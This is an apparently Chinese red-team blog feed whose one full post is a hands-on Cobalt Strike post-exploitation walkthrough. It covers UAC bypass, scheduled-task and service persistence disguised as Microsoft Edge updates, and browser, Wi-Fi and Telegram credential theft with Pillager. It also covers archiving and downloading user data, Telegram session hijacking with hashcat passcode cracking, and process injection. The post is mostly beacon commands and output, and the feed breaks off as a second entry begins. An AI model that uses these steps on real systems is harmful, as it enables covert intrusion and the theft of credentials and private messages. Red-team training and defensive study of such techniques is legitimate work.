<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cber</title>
  
  <subtitle>要问山下路 | 顺问过来人</subtitle>
  <link href="https://axusun01.github.io/atom.xml" rel="self"/>
  
  <link href="https://axusun01.github.io/"/>
  <updated>2024-07-30T10:56:35.632Z</updated>
  <id>https://axusun01.github.io/</id>
  
  <author>
    <name>Cber</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>后渗透操作</title>
    <link href="https://axusun01.github.io/2024/07/30/d9d69102/"/>
    <id>https://axusun01.github.io/2024/07/30/d9d69102/</id>
    <published>2024-07-30T08:26:05.000Z</published>
    <updated>2024-07-30T10:56:35.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-Find-AV"><a href="#1-Find-AV" class="headerlink" title="1.Find AV"></a>1.Find AV</h1><p>Find AV（利用CS完成）</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301633963.png" alt="image-20240730163327890"></p><p>若找到的杀软是360，需要查看是否开启了晶核，Start值为1则说明开启了核晶，维权后需要进行降级操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shell reg query HKLM\SYSTEM\CurrentControlSet\services\360Hvm</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\360Hvm</span><br><span class="line">    Type    REG_DWORD    0x1</span><br><span class="line">    Start    REG_DWORD    0x4</span><br><span class="line">    ErrorControl    REG_DWORD    0x1</span><br><span class="line">    ImagePath    REG_SZ    System32\Drivers\360Hvm64.sys</span><br><span class="line">    DisplayName    REG_SZ    360Safe HVM</span><br><span class="line">    WorkConfig    REG_DWORD    0x1</span><br><span class="line">    Tag    REG_DWORD    0x0</span><br><span class="line">    extensionconfig    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><p>降权操作参考注意事项。</p><h1 id="2-BypassUAC"><a href="#2-BypassUAC" class="headerlink" title="2.BypassUAC"></a>2.BypassUAC</h1><p>查看上线目标当前用户权限，以我本机测试为例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami /all</span><br><span class="line">[*] Tasked beacon to run: whoami /all</span><br><span class="line">[+] host called home, sent: 42 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名              SID                                           </span><br><span class="line">=================== ==============================================</span><br><span class="line">desktop-*****\*** S-1-5-21-13*****34-4117737026-312*****1670-1***</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">组信息</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">组名                                   类型   SID          属性                          </span><br><span class="line">====================================== ====== ============ ==============================</span><br><span class="line">Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\本地帐户和管理员组成员    已知组 S-1-5-114    只用于拒绝的组                </span><br><span class="line">BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组                </span><br><span class="line">BUILTIN\Performance Log Users          别名   S-1-5-32-559 必需的组, 启用于默认, 启用的组</span><br><span class="line">BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组</span><br><span class="line">CONSOLE LOGON                          已知组 S-1-2-1      必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\本地帐户                  已知组 S-1-5-113    必需的组, 启用于默认, 启用的组</span><br><span class="line">LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组</span><br><span class="line">NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组</span><br><span class="line">Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特权信息</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">特权名                        描述                 状态  </span><br><span class="line">============================= ==================== ======</span><br><span class="line">SeShutdownPrivilege           关闭系统             已禁用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查         已启用</span><br><span class="line">SeUndockPrivilege             从扩展坞上取下计算机 已禁用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span><br><span class="line">SeTimeZonePrivilege           更改时区             已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当前用户属于本地账户和管理员组，但是由于是Medium Mandatory Level，因此要想获取完整的权限需要bypassUAC</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301641032.png" alt="image-20240730164133995"></p><p>选择bypassUAC的时候执行的负载</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301646309.png" alt="image-20240730164600266"></p><p>不一会儿就会获得一个具有管理员权限的shell</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301647881.png" alt="image-20240730164700842"></p><p>如果目标用户不是管理员，先维持住这个目标的shell，后续在考虑单独提权。</p><h1 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h1><h2 id="3-1利用计划任务"><a href="#3-1利用计划任务" class="headerlink" title="3.1利用计划任务"></a>3.1利用计划任务</h2><p>将下列文件传输到目标机器，我们可以改动的只有output.lua和MicrosoftEdgeUpdateTask.exe的文件名。</p><p><img src="C:\Users\23705\AppData\Roaming\Typora\typora-user-images\image-20240730165417505.png" alt="image-20240730165417505"></p><p>创建计划任务去执行我们的MicrosoftEdgeUpdate32.exe</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301654483.png" alt="image-20240730165446419"></p><p>第一行填写计划任务名称，伪装一下。第二行是我们有效负载的路径。第三行是有效负载的参数，没有可以省略。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301655301.png" alt="image-20240730165508216"></p><p>由于伪造的是微软的Edge更新服务，因此可以将该负载保存到C:\Program Files (x86)\Microsoft\Edge\Application路径下。</p><p>确定计划任务创建成功。每天22点执行我们的有效负载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] Pipe Name: \\.\pipe\8dceb61aff8c4c3d</span><br><span class="line">[+] host called home, sent: 19015 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[+] Add Task Successfully!</span><br><span class="line"></span><br><span class="line">beacon&gt; shell schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[*] Tasked beacon to run: schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[+] host called home, sent: 76 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">文件夹: \</span><br><span class="line">任务名                                   下次运行时间           模式           </span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">MicrosoftEdgeUpdateTask                  2024/3/8 22:00:00      就绪  </span><br></pre></td></tr></table></figure><p>清除我们的计划任务（<strong>不必要</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell schtasks /delete /tn &quot;MicrosoftEdgeUpdateTask&quot; /f</span><br><span class="line">[*] Tasked beacon to run: schtasks /delete /tn &quot;MicrosoftEdgeUpdateTask&quot; /f</span><br><span class="line">[+] host called home, sent: 80 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">成功: 计划的任务 &quot;MicrosoftEdgeUpdateTask&quot; 被成功删除。</span><br><span class="line"></span><br><span class="line">beacon&gt; shell schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[*] Tasked beacon to run: schtasks /query /tn &quot;MicrosoftEdgeUpdateTask&quot;</span><br><span class="line">[+] host called home, sent: 76 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">错误: 系统找不到指定的文件。</span><br></pre></td></tr></table></figure><p>查看所有的计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /query /fo LIST</span><br></pre></td></tr></table></figure><p>立即执行计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /run /tn &quot;YourTaskName&quot;</span><br></pre></td></tr></table></figure><p>其他：</p><p>创建一个DataProtecionTask的计划任务，然后将可执行文件重命名位dataprotection.exe，</p><p><a href="https://forums.ivanti.com/s/article/Application-Control-Files-to-exclude-for-Azure-Site-Recovery-software?language=en_US">参照下列可执行文件路径</a></p><p>c:\program files (x86)\microsoft azure site recovery\agent\dataprotection.exe</p><h2 id="3-2利用服务上传下列文件到目标机器的"><a href="#3-2利用服务上传下列文件到目标机器的" class="headerlink" title="3.2利用服务上传下列文件到目标机器的"></a>3.2利用服务上传下列文件到目标机器的</h2><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301658142.png" alt="image-20240730165848094"></p><p>创建一个我们的服务来执行该有效负载EdgeUpdate.exe</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301659881.png" alt="image-20240730165923836"></p><p>设置如下</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301659698.png" alt="image-20240730165944659"></p><p>创建完成后稍后会自动执行，会重新上线一台目标主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell sc query Micr0s0ftEdgeUpdate</span><br><span class="line">[*] Tasked beacon to run: sc query Micr0s0ftEdgeUpdate</span><br><span class="line">[+] host called home, sent: 59 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Micr0s0ftEdgeUpdate </span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line"></span><br><span class="line">beacon&gt; shell sc qc Micr0s0ftEdgeUpdate</span><br><span class="line">[*] Tasked beacon to run: sc qc Micr0s0ftEdgeUpdate</span><br><span class="line">[+] host called home, sent: 56 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[SC] QueryServiceConfig 成功</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Micr0s0ftEdgeUpdate</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS </span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\System32\EdgeUpdate.exe --update</span><br><span class="line">        LOAD_ORDER_GROUP   : </span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Micr0s0ftEdgeUpdate</span><br><span class="line">        DEPENDENCIES       : </span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure><h1 id="4-取证"><a href="#4-取证" class="headerlink" title="4.取证"></a>4.取证</h1><p>参考链接：<a href="https://predit.notion.site/41b1f25305cc4859932cae366bd21754">https://predit.notion.site/41b1f25305cc4859932cae366bd21754</a></p><h2 id="4-1利用Pillager取证"><a href="#4-1利用Pillager取证" class="headerlink" title="4.1利用Pillager取证"></a>4.1利用Pillager取证</h2><p><strong>Pillager</strong>利用<a href="https://github.com/qwqdanchun/Pillager">Pillager</a>来收集目标浏览器上的密码。结果保存在</p><p>%Temp%\Pillager.zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; ?</span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    !                         Run a command from the history</span><br><span class="line">    Pillager                  Get Browser Password</span><br><span class="line"></span><br><span class="line">beacon&gt; Pillager</span><br><span class="line">[*] Results can be found at %temp%\Pillager.zip</span><br><span class="line">[+] host called home, sent: 93389 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell echo %temp%</span><br><span class="line">[*] Tasked beacon to run: echo %temp%</span><br><span class="line">[+] host called home, sent: 42 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">C:\Users\YANGXI~1\AppData\Local\Temp</span><br><span class="line"></span><br><span class="line">beacon&gt; download C:\Users\****\AppData\Local\Temp\Pillager.zip</span><br><span class="line">[*] Tasked beacon to download C:\Users\YANGXI~1\AppData\Local\Temp\Pillager.zip</span><br><span class="line">[+] host called home, sent: 57 bytes</span><br><span class="line">[*] started download of C:\Users\YANGXI~1\AppData\Local\Temp\Pillager.zip (223918 bytes)</span><br><span class="line">[*] download of Pillager.zip is complete</span><br></pre></td></tr></table></figure><p>成功下载Pillager.zip后，结果暂存在cs上，点击底部的Sync Files将其下载到本地</p><p><img src="C:\Users\23705\AppData\Roaming\Typora\typora-user-images\image-20240730171158954.png" alt="image-20240730171158954"></p><p>搜集到的结果如下，有各个浏览器中的数据以及安装了的应用程序列表。<strong>Wifi文件夹</strong>中保存的是目标连接过的Wifi密码，<strong>ScreenShot文件夹</strong>是运行Pillager命令时的屏幕截图。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301712607.png" alt="image-20240730171227537"></p><p><strong>使用7za.exe打包感兴趣的目录</strong></p><p>上传7za.exe到目标机器</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301712532.png" alt="image-20240730171254496"></p><p>使用下列命令打包感兴趣的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">7za.exe a -tzip &lt;output_file&gt; &lt;target_file&gt; -xr!&lt;excluded_file&gt;</span><br><span class="line"></span><br><span class="line">Eg:将本用户的桌面文件打包到存储到C:\Windows\Temp\desktop.zip,排除shipin文件夹</span><br><span class="line">C:\windows\system32\7za.exe a -tzip C:\Windows\Temp\Yandesktop.zip C:\Users\Yan\Desktop -xr!&quot;shipin&quot;</span><br><span class="line">[snip]</span><br><span class="line">Everything is Ok</span><br><span class="line"></span><br><span class="line">Kernel  Time =    28.171 =    9%</span><br><span class="line">User    Time =   230.781 =   74%</span><br><span class="line">Process Time =   258.953 =   83%    Virtual  Memory =    148 MB</span><br><span class="line">Global  Time =   308.599 =  100%    Physical Memory =    150 MB</span><br><span class="line"></span><br><span class="line">shell 7za.exe a -tzip C:\Windows\Temp\xudesktop.zip </span><br><span class="line">&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\&quot; </span><br><span class="line">-xr!&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\Telegram Desktop.zip&quot; </span><br><span class="line">-xr!&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\Telegram Desktop-123810274.zip&quot; </span><br><span class="line">-xr!&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\Telegram.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="4-2Telegram会话劫持"><a href="#4-2Telegram会话劫持" class="headerlink" title="4.2Telegram会话劫持"></a>4.2Telegram会话劫持</h2><p>参考：<a href="https://www.ifmobi.com/telegram/1150.html">https://www.ifmobi.com/telegram/1150.html</a><br>在进行TG会话劫持之前首先使用目标机器搭建socks代理，然后通过代理去执行TG应用程序从而注意OPSEC。</p><p>查看TG的文件路径，为了方便定位TG的文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell wmic process where caption=&quot;Telegram.exe&quot; get caption,commandline,executablepath /value</span><br><span class="line">[*] Tasked beacon to run: wmic process where caption=&quot;Telegram.exe&quot; get caption,commandline,executablepath /value</span><br><span class="line">[+] host called home, sent: 118 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Caption=Telegram.exe</span><br><span class="line">CommandLine=&quot;D:\Telegram Desktop\Telegram.exe&quot; </span><br><span class="line">ExecutablePath=D:\Telegram Desktop\Telegram.exe</span><br></pre></td></tr></table></figure><p>打包TG的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\Administrator\Documents\7za.exe a -tzip C:\Windows\Temp\TG.zip &quot;D:\Telegram Desktop\&quot; -xr!&quot;D:\Telegram Desktop\tdata\dumps\&quot; -xr!&quot;D:\Telegram Desktop\tdata\emoji\&quot; -xr!&quot;D:\Telegram Desktop\tdata\tdummy\&quot; -xr!&quot;D:\Telegram Desktop\tdata\temp\&quot;</span><br></pre></td></tr></table></figure><p>主要目标是下列三个文件，可以利用<strong>Pillager</strong>帮助快速收集。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301715698.png" alt="image-20240730171559644"></p><p>有的情况下，一个telegram客户端可能登录着多个用户（不超过3个），所有用户的session文件依旧保存在</p><p>tdata下。telegram客户端会根据登录的次序进行编号，分别为</p><p>data，</p><p>data#2，</p><p>data#3，在session劫持的时候按照文件名进行迁移即可。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301716429.png" alt="image-20240730171637363"></p><p>将上述的3个文件替换掉本地TG中的对应文件。然后执行TG的可执行程序。</p><p>在进行session劫持的过程中，有概率会遇到含有passcode的情况，如下图所示。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301830567.png" alt="image-20240730183031455"></p><p><strong>passcode爆破</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#获取生成的tg.hash文件需要把开头的“key_datas:”删除</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python telegram2john.py key_datas &gt; tg.hash </span><br><span class="line"></span><br><span class="line">#试用掩码方式跑1-6位数字(示掩码太小破解速度很慢)</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hashcat -m 24500 -a 3 --force tg.hash --increment --increment-min 1 --increment-max 6 ?d?d?d?d?d?d</span><br><span class="line"></span><br><span class="line">#生成好1-6位数字字典，用字典跑速度会快一些</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hashcat.exe -m 24500 -a 0 --force tg.hash 1-6.txt</span><br></pre></td></tr></table></figure><p>用来生成1-6位数字的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">digits = &quot;0123456789&quot;  # 可用的数字</span><br><span class="line"></span><br><span class="line"># 生成1到6位数字组合</span><br><span class="line">combinations = []</span><br><span class="line">for i in range(1, 7):</span><br><span class="line">    combinations.extend([&#x27;&#x27;.join(c) for c in itertools.product(digits, repeat=i)])</span><br><span class="line"></span><br><span class="line"># 打印结果</span><br><span class="line">for combination in combinations:</span><br><span class="line">    print(combination)</span><br></pre></td></tr></table></figure><p>在进行session劫持的过程中，如果一直都无法恢复session，并且能够确认session文件没有过期，那么有可能是本地的Telegram.exe版本与目标机器的Telegram.exe不匹配造成的。</p><p><strong>解决办法：</strong></p><p> ①查看tg主程序MD5（判断版本） </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil</span><br></pre></td></tr></table></figure><p>②通过下载的session加密文件判断版本： </p><p> 比如key_datas文件用winhex打开，第一行的后四个字节就是版本号，通过进制转换后对应版本号就 是：3.5.1</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301833029.png" alt="image-20240730183318897"></p><h1 id="5-注意事项"><a href="#5-注意事项" class="headerlink" title="5 注意事项"></a>5 注意事项</h1><h2 id="5-1-SYSTEM权限计划任务维权"><a href="#5-1-SYSTEM权限计划任务维权" class="headerlink" title="5.1 SYSTEM权限计划任务维权"></a>5.1 SYSTEM权限计划任务维权</h2><p>在SYSTEM权限下使用计划任务维权时，如果使用CS脚本功能那么计划任务上线的用户只是普通用户。因为创建计划任务的时候默认是以Users的权限运行的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Folder: \</span><br><span class="line">HostName         TaskName                                 Next Run Time          Status          Logon Mode              Last Run Time           Last Result Author           Task To Run                                        Start In                                 Comment                                                                          Scheduled Task State   Idle Time                                Power Management                                 Run As User                              Delete Task If Not Rescheduled Stop Task If Runs X Hours and X Mins     Schedule                                                                         Schedule Type                Start Time   Start Date End Date   Days                                        Months                                      Repeat: Every            Repeat: Until: Time  Repeat: Until: Duration        Repeat: Stop If Still Running      </span><br><span class="linespan><br><span class="line">DESKTOP-2LNH3UM  DataProtectS                             2024/3/11 22:00:00     Running         Interactive/Background  2024/3/11 10:25:16      -2147020576 N/A              C:\windows\system32\dataprotectionx86.exe          N/A                                      Microsoft Edge Update Task for Machine Admin.                                    Enabled                Disabled                                 Stop On Battery Mode                             Users                                    Disabled                       Disabled                                 Scheduling data is not available in this format.                                 Daily                        22:00:00     2000/1/21  N/A        Every 1 day(s)</span><br></pre></td></tr></table></figure><p>使用下列命令创建一个以SYSTEM权限运行负载的计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#删除原有的计划任务</span><br><span class="line">schtasks /delete /tn &quot;DataProtectS&quot;</span><br><span class="line"></span><br><span class="line">#创建新的计划任务，以SYSTEM权限运行</span><br><span class="line">schtasks /create /tn &quot;DataProtectS&quot; /tr &quot;C:\windows\system32\dataprotectionx86&quot; /sc DAILY /st 19:00 /RU &quot;SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">#查看该计划任务</span><br><span class="line">schtasks /query /tn &quot;DataProtectS&quot; -v</span><br><span class="line"></span><br><span class="line">#强制计划任务执行</span><br><span class="line">schtasks /run /tn &quot;DataProtectS&quot;</span><br></pre></td></tr></table></figure><h2 id="5-2-SYSTEM降权"><a href="#5-2-SYSTEM降权" class="headerlink" title="5.2 SYSTEM降权"></a>5.2 SYSTEM降权</h2><p><strong>不能在SYSTEM权限下截图</strong>，而且截图的时候<strong>需要注入我们自己的进程</strong>。如果我们拥有SYSTEM权限的会话，但是想要截图，这个时候就需要降权。</p><p>进程注入</p><p>以SYSTEM权限直接找到普通用户的进程然后注入，可以看到新上线的shell的负载是explorer.exe，我们将rs payload注入到了其中。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301837445.png"></p><p>示例：<img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301838735.png" alt="image-20240730183841622"></p><p>在此注入进程就会上线Admin*，在新上线机子找到对应的进程，截图如果发现它一直在截图杀掉对应的进程JID</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301840152.png" alt="image-20240730184001102"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Find-AV&quot;&gt;&lt;a href=&quot;#1-Find-AV&quot; class=&quot;headerlink&quot; title=&quot;1.Find AV&quot;&gt;&lt;/a&gt;1.Find AV&lt;/h1&gt;&lt;p&gt;Find AV（利用CS完成）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://g</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    <category term="红队" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%BA%A2%E9%98%9F/"/>
    
    
    <category term="攻防演练" scheme="https://axusun01.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="事件研判" scheme="https://axusun01.github.io/tags/%E4%BA%8B%E4%BB%B6%E7%A0%94%E5%88%A4/"/>
    
    <category term="应急响应" scheme="https://axusun01.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="安全运营" scheme="https://axusun01.github.io/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    <category term="红队" scheme="https://axusun01.github.io/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>Nacos未授权</title>
    <link href="https://axusun01.github.io/2024/07/05/d9d69101/"/>
    <id>https://axusun01.github.io/2024/07/05/d9d69101/</id>
    <published>2024-07-05T12:14:32.000Z</published>
    <updated>2024-07-05T12:30:02.340Z</updated>
    
